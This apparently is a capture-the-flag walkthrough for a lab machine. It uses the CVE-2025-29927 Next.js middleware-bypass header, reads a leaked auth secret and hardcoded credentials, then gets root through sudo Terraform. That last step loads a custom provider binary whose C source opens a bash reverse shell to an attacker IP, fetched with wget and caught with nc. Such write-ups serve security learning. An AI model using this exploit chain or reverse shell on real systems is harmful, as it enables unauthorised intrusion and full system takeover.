![[IMG-20250823234029175.png]]
## Foothold

### [CVE-2025-29927](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927)

![[IMG-20250824012840494.png]]

![[IMG-20250824012910247.png]]
USE:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

![[IMG-20250824012954799.png]]

![[IMG-20250824013047596.png]]

![[IMG-20250824172304583.png]]

![[IMG-20250824171318691.png]]



![[IMG-20250824171346486.png]]

![[IMG-20250824172115997.png]]

```
NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a
```

![[IMG-20250825144128893.png]]

```
  "/api/auth/[...nextauth]": "pages/api/auth/[...nextauth].js",
```

![[IMG-20250825144743209.png]]

```js
let o = {
        session: { strategy: "jwt" },
        providers: [
          r.n(CredentialsProvider)()({
            name: "Credentials",
            credentials: {
              username: { label: "User", type: "username" },
              password: { label: "Password", type: "password" }
            },
            authorize: async e =>
              e?.username === "jeremy" &&
              e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
                ? { id: "1", name: "Jeremy" }
                : null
          })
        ],
        pages: { signIn: "/signin" },
        secret: process.env.NEXTAUTH_SECRET
      };
```

## User Flag

```
user: jeremy
password: MyNameIsJeremyAndILovePancakes
```

![[IMG-20250825144931061.png]]

## Root Flag

### Analyse

![[IMG-20250825172605435.png]]

![[IMG-20250825180207799.png]]

### Exploit

[Doc Terraform](https://developer.hashicorp.com/terraform/cli/config/environment-variables)

![[IMG-20250825172549609.png]]

Load a config file custom.

![[IMG-20250825173844708.png]]

### Attacker machine

```bash
gcc main.c -o terraform-provider-examples
python3 -m http.server 8000
nc -lvnp 4444
```

main.c:
```c
#include <unistd.h>
int main() {
    execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/10.10.14.141/4444 0>&1", NULL);
    return 0;
}

```

### Victim machine

```bash
wget http://10.10.14.141:8000/terraform-provider-examples
chmod +x terraform-provider-examples
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

![[IMG-20250825175332705.png]]

![[IMG-20250825175351049.png]]



![[IMG-20250825165336107.png]]
